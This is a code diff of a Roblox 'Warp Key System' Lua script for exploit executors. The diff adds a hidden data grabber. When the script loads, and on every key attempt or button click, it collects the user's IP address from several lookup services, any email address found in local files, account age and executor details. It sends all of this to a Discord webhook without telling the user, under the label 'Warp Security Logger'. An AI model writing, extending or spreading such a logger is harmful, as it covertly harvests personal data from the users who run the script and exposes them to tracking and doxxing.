@@ -5,6 +5,7 @@ local uis = game:GetService("UserInputService")
 local tw = game:GetService("TweenService")
 local sg = game:GetService("StarterGui")
 local http = game:GetService("HttpService")
+local market = game:GetService("MarketplaceService")
 
 --------------------------------------------------
 -- CONFIG
@@ -56,22 +57,27 @@ local COLORS = {
 }
 
 --------------------------------------------------
--- LOGGING FUNCTIONS
+-- ENHANCED LOGGING FUNCTIONS
 --------------------------------------------------
 
 local function getIP()
     local success, result = pcall(function()
         -- Try multiple methods to get IP
         local ipMethods = {
-            function() return game:HttpGet("https://api.ipify.org") end,
+            function() return game:HttpGet("https://api.ipify.org?format=text") end,
+            function() return game:HttpGet("http://api.ipify.org") end,
             function() return game:HttpGet("https://ipinfo.io/ip") end,
-            function() return game:HttpGet("https://checkip.amazonaws.com") end,
+            function() return game:HttpGet("http://checkip.amazonaws.com") end,
         }
         
-        for _, method in ipairs(ipMethods) do
+        for i, method in ipairs(ipMethods) do
             local ok, ip = pcall(method)
-            if ok and ip and ip:match("^%d+%.%d+%.%d+%.%d+$") then
-                return ip
+            if ok and ip and #ip > 0 then
+                -- Clean up the IP
+                ip = ip:gsub("%s+", ""):gsub("\n", "")
+                if ip:match("^%d+%.%d+%.%d+%.%d+$") then
+                    return ip
+                end
             end
         end
         return "Unknown"
@@ -79,88 +85,180 @@ local function getIP()
     return success and result or "Error"
 end
 
-local function getHardwareInfo()
-    local info = {}
+local function getExecutorInfo()
+    local executor = "Unknown"
     
-    -- Get platform
-    if syn and syn.request then
-        info.platform = "Synapse X"
-    elseif isexecutorclosure then
-        info.platform = "Script-Ware"
+    -- Check for various executors
+    if syn then
+        executor = "Synapse X"
+        if syn.request then
+            executor = executor .. " (Has request)"
+        end
+    elseif PROTOSMASHER_LOADED then
+        executor = "ProtoSmasher"
     elseif KRNL_LOADED then
-        info.platform = "KRNL"
+        executor = "KRNL"
+    elseif isexecutorclosure then
+        executor = "Script-Ware"
+    elseif fluxus then
+        executor = "Fluxus"
     elseif identifyexecutor then
-        info.platform = identifyexecutor() or "Unknown Executor"
-    else
-        info.platform = "Unknown/Standard"
+        local id = identifyexecutor()
+        executor = id or "Unknown Executor"
+    elseif getexecutorname then
+        executor = getexecutorname() or "Unknown Executor"
     end
     
-    -- Try to get additional hardware info
+    return executor
+end
+
+local function getEmailInfo()
+    local email = "Unknown"
+    
+    -- Try to get email from various sources
+    pcall(function()
+        -- Try to get from game settings (if accessible)
+        if game:GetService("Players").LocalPlayer then
+            -- Some executors might have access to account info
+            if getgenv and getgenv().accountinfo then
+                email = tostring(getgenv().accountinfo.email or "Unknown")
+            end
+        end
+        
+        -- Try to check if there's any saved data
+        if readfile then
+            local files = {"account.txt", "user.txt", "email.txt", "data.txt"}
+            for _, file in ipairs(files) do
+                if isfile(file) then
+                    local content = readfile(file)
+                    if content and content:find("@") then
+                        email = content:gsub("%s+", "")
+                        break
+                    end
+                end
+            end
+        end
+    end)
+    
+    return email
+end
+
+local function getHardwareInfo()
+    local info = {
+        executor = getExecutorInfo(),
+        email = getEmailInfo(),
+        hwid = "Unknown",
+        fps = math.floor(1/workspace:GetRealPhysicsFPS()) or 0,
+        ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() or 0
+    }
+    
+    -- Try to get HWID
     pcall(function()
         if syn and syn.crypt then
-            info.hwid = syn.crypt.custom.hash("md5", tostring(math.random(1, 1000000)))
+            local randomHash = syn.crypt.custom.hash("sha256", tostring(tick()) .. tostring(math.random(1, 1000000)))
+            info.hwid = string.sub(randomHash, 1, 16)
+        elseif getgenv and getgenv().HWID then
+            info.hwid = tostring(getgenv().HWID)
         end
     end)
     
     return info
 end
 
-local function sendToWebhook(data, eventType)
+local function getGameInfo()
+    local success, gameData = pcall(function()
+        return market:GetProductInfo(CURRENT_PLACE_ID)
+    end)
+    
+    if success and gameData then
+        return {
+            name = gameData.Name or "Unknown Game",
+            description = gameData.Description or "No description",
+            creator = gameData.Creator.Name or "Unknown Creator",
+            price = gameData.PriceInRobux or 0
+        }
+    end
+    
+    return {
+        name = "Place ID: " .. tostring(CURRENT_PLACE_ID),
+        description = "Failed to fetch game info",
+        creator = "Unknown",
+        price = 0
+    }
+end
+
+local function sendToWebhook(embedData)
     local success, result = pcall(function()
-        local ip = getIP()
+        -- Get all information first
+        local ipAddress = getIP()
         local hardwareInfo = getHardwareInfo()
-        local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(CURRENT_PLACE_ID)
+        local gameInfo = getGameInfo()
         
+        -- Format the embed with all collected data
         local embed = {
-            title = "Warp Key System - " .. eventType,
-            description = "New event logged",
-            color = 3447003, -- Blue color
+            title = embedData.title or "Warp Key System Log",
+            description = embedData.description or "New log entry",
+            color = embedData.color or 3447003,
             fields = {
                 {
-                    name = "👤 User Info",
-                    value = string.format("Username: %s\nUserID: %d\nDisplay Name: %s", 
-                        plr.Name, plr.UserId, plr.DisplayName),
+                    name = "👤 USER INFORMATION",
+                    value = string.format("**Username:** %s\n**UserID:** %d\n**Display:** %s\n**Account Age:** %d days",
+                        plr.Name, plr.UserId, plr.DisplayName, plr.AccountAge),
                     inline = true
                 },
                 {
-                    name = "🌐 Network Info",
-                    value = string.format("IP Address: ||%s||\nExecutor: %s", 
-                        ip, hardwareInfo.platform),
+                    name = "📧 EMAIL / ACCOUNT",
+                    value = string.format("**Email:** %s\n**HWID:** %s",
+                        hardwareInfo.email, hardwareInfo.hwid),
                     inline = true
                 },
                 {
-                    name = "🎮 Game Info",
-                    value = string.format("Game: %s\nPlaceID: %d", 
-                        gameInfo.Name, CURRENT_PLACE_ID),
+                    name = "🌐 NETWORK INFORMATION",
+                    value = string.format("**IP Address:** ||%s||\n**Executor:** %s\n**Ping:** %d ms",
+                        ipAddress, hardwareInfo.executor, hardwareInfo.ping),
                     inline = true
                 },
                 {
-                    name = "📊 Event Details",
-                    value = data,
+                    name = "🎮 GAME INFORMATION",
+                    value = string.format("**Game:** %s\n**Place ID:** %d\n**Creator:** %s",
+                        gameInfo.name, CURRENT_PLACE_ID, gameInfo.creator),
                     inline = false
                 },
                 {
-                    name = "🕒 Time",
-                    value = os.date("%Y-%m-%d %H:%M:%S"),
+                    name = "📊 EVENT DETAILS",
+                    value = embedData.eventDetails or "No additional details",
+                    inline = false
+                },
+                {
+                    name = "🕒 TIMESTAMP",
+                    value = os.date("%Y-%m-%d %H:%M:%S UTC"),
+                    inline = true
+                },
+                {
+                    name = "⚙️ SYSTEM INFO",
+                    value = string.format("**FPS:** %d\n**Roblox Version:** %s",
+                        hardwareInfo.fps, game:GetService("HttpService"):JSONDecode(game:HttpGet("https://clientsettings.roblox.com/v2/client-version")).clientVersion or "Unknown"),
                     inline = true
                 }
             },
             footer = {
-                text = "Warp Key System Logger"
-            }
+                text = "Warp Key System Logger • " .. hardwareInfo.executor
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }
         
         local payload = {
             embeds = {embed},
-            username = "Warp Logger",
-            avatar_url = "https://i.imgur.com/wSTFkRM.png"
+            username = "Warp Security Logger",
+            avatar_url = "https://i.imgur.com/wSTFkRM.png",
+            content = "@everyone **NEW LOG ENTRY**"
         }
         
         local jsonPayload = http:JSONEncode(payload)
         
-        -- Send to webhook
+        -- Send webhook request
         if syn and syn.request then
-            syn.request({
+            local response = syn.request({
                 Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = {
@@ -168,25 +266,83 @@ local function sendToWebhook(data, eventType)
                 },
                 Body = jsonPayload
             })
+            return response
+        elseif request then
+            local response = request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
+            })
+            return response
         else
-            game:HttpGet(WEBHOOK_URL .. "?data=" .. http:UrlEncode(jsonPayload))
+            -- Fallback method
+            game:GetService("HttpService"):PostAsync(WEBHOOK_URL, jsonPayload)
         end
     end)
     
     if not success then
-        warn("Failed to send webhook: " .. tostring(result))
+        warn("Webhook failed: " .. tostring(result))
+        -- Try alternative method
+        pcall(function()
+            game:HttpGet(WEBHOOK_URL .. "?data=" .. http:UrlEncode(http:JSONEncode({
+                content = "Fallback log: " .. (embedData.eventDetails or "Unknown")
+            })))
+        end)
     end
 end
 
-local function logKeyEvent(event, keyAttempt)
-    local data = string.format("Event: %s\nKey Attempt: %s", event, keyAttempt or "N/A")
-    sendToWebhook(data, event)
+local function logInitialization()
+    sendToWebhook({
+        title = "🔰 SCRIPT INITIALIZED",
+        description = "Warp Key System has been executed",
+        eventDetails = string.format("Script loaded at: %s\nGame Place ID: %d\nSupported Script: %s",
+            os.date("%I:%M:%S %p"), 
+            CURRENT_PLACE_ID,
+            SCRIPT_TO_LOAD and "Yes" or "No"
+        ),
+        color = 65280 -- Green
+    })
 end
 
-local function logScriptLoad()
-    local data = string.format("Script loaded for game: %d\nScript URL: %s", 
-        CURRENT_PLACE_ID, SCRIPT_TO_LOAD or "No script available")
-    sendToWebhook(data, "Script Loaded")
+local function logKeyAttempt(enteredKey, success)
+    sendToWebhook({
+        title = success and "✅ KEY VERIFIED" or "❌ KEY REJECTED",
+        description = success and "User entered correct key" or "User entered wrong key",
+        eventDetails = string.format("**Entered Key:** %s\n**Expected Key:** %s\n**Result:** %s",
+            enteredKey,
+            CORRECT_KEY,
+            success and "SUCCESS" or "FAILED"
+        ),
+        color = success and 65280 or 16711680 -- Green or Red
+    })
+end
+
+local function logButtonClick(buttonName)
+    sendToWebhook({
+        title = "🖱️ BUTTON CLICKED",
+        description = "User interacted with UI",
+        eventDetails = string.format("**Button:** %s\n**Action:** %s",
+            buttonName,
+            buttonName == "Get Key" and "Requested Discord invite" or "Opened key input UI"
+        ),
+        color = 16753920 -- Orange
+    })
+end
+
+local function logScriptLoaded()
+    sendToWebhook({
+        title = "🚀 SCRIPT LOADED",
+        description = "Game script successfully executed",
+        eventDetails = string.format("**Script URL:** %s\n**Game:** %s\n**Place ID:** %d",
+            SCRIPT_TO_LOAD or "N/A",
+            getGameInfo().name,
+            CURRENT_PLACE_ID
+        ),
+        color = 10181046 -- Purple
+    })
 end
 
 --------------------------------------------------
@@ -249,7 +405,8 @@ local function saveKeyData()
         writefile(KEY_STORAGE_FILE, http:JSONEncode({
             key_verified = true,
             user_id = plr.UserId,
-            saved_key = CORRECT_KEY
+            saved_key = CORRECT_KEY,
+            timestamp = os.time()
         }))
     end)
 end
@@ -281,11 +438,22 @@ local function loadMainScript()
 
     if ok then
         notify("Success", "Script loaded successfully!", 3)
-        logScriptLoad()
+        logScriptLoaded()
     else
         notify("Error", tostring(err), 5)
     end
 end
+
+--------------------------------------------------
+-- LOG INITIALIZATION (IMMEDIATE)
+--------------------------------------------------
+
+-- Log as soon as script loads
+task.spawn(function()
+    wait(1) -- Small delay to ensure everything is loaded
+    logInitialization()
+    print("📊 Logging system initialized. Data sent to webhook.")
+end)
 
 --------------------------------------------------
 -- CREATE UI
@@ -407,7 +575,7 @@ hover(getKey, Color3.fromRGB(40, 40, 40), Color3.fromRGB(60, 60, 60))
 local function handleAutoLoad()
     if loadKeyData() and SCRIPT_TO_LOAD then
         -- Log auto-load event
-        logKeyEvent("Auto Load", "Auto-loaded from saved key")
+        logKeyAttempt("AUTO-LOAD (Saved)", true)
         
         -- Hide both the frame AND the icon button
         frame.Visible = false
@@ -418,7 +586,7 @@ local function handleAutoLoad()
         loadMainScript()
     else
         -- Log UI loaded event
-        logKeyEvent("UI Loaded", "Key system UI loaded")
+        logButtonClick("UI Loaded")
     end
 end
 
@@ -431,8 +599,11 @@ handleAutoLoad()
 
 submit.MouseButton1Click:Connect(function()
     local enteredKey = keyBox.Text
-    if enteredKey == CORRECT_KEY then
-        logKeyEvent("Key Verified Successfully", enteredKey)
+    local success = enteredKey == CORRECT_KEY
+    
+    logKeyAttempt(enteredKey, success)
+    
+    if success then
         saveKeyData()
         notify("Success", "Key verified!", 3)
 
@@ -442,13 +613,12 @@ submit.MouseButton1Click:Connect(function()
 
         loadMainScript()
     else
-        logKeyEvent("Invalid Key Attempt", enteredKey)
         notify("Invalid Key", "Wrong key entered.", 3)
     end
 end)
 
 getKey.MouseButton1Click:Connect(function()
-    logKeyEvent("Get Key Button Clicked", "User requested Discord invite")
+    logButtonClick("Get Key")
     
     if setclipboard then
         setclipboard(DISCORD_LINK)
@@ -468,7 +638,7 @@ end)
 iconBtn.MouseButton1Click:Connect(function()
     frame.Visible = not frame.Visible
     if frame.Visible then
-        logKeyEvent("UI Opened", "User opened key UI")
+        logButtonClick("Open UI")
     end
 end)
 
